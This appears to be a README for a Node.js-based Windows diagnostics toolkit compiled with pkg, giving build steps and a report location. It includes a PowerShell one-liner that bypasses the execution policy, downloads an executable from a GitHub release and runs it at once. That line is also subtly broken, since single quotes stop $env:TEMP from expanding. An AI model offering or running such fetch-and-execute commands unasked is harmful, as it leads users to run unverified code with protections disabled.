# Windows Diagnostic Toolkit

Modular JavaScript diagnostics toolkit that compiles to one standalone Windows executable.

## Build

```powershell
npm install
npm run build
```

Output:

- `dist/diagnostics.exe`

## Alternative explicit pkg command

```powershell
npx pkg -t node18-win-x64 --compress Brotli -o dist/diagnostics.exe src/main.js
```

If your local `pkg` runtime supports generic targets, this equivalent pattern is also valid:

```powershell
npx pkg -t win-x64 --compress Brotli -o dist/diagnostics.exe src/main.js
```

## Run (headless)

```powershell
dist\diagnostics.exe
```

Remote pull + run example:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://github.com/artificialai223/DiagnosticToolkit/releases/latest/download/diagnostics.exe'; $p='$env:TEMP\diagnostics.exe'; iwr $u -OutFile $p; & $p"
```

## Report output

- `C:\Windows\Temp\SystemHealthReport.html`
